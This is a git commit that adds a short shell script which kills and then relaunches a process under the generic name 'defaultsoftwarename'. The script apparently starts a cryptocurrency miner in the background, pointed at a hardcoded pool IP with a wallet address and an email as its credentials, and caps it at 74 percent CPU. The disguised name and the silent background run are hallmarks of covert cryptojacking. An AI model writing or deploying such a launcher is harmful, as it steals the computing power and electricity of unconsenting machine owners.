963fab1392f381e2753cb96604116bbe98c61e11
kapiks <52073154+kapiks@users.noreply.github.com>
2019-06-21 19:34:39 +0000

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 5.45.67.137:28574 -u 4Aqy81L8Pcvi9vFxyaKWcoUD2a8XLYd3u9TMbWs6grPv4tXJVSjbEsAWK8NXTij9UZTCmcMwwLq9aLtugAjg2CeUD7hATJ9 --pass=x:sahurob@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
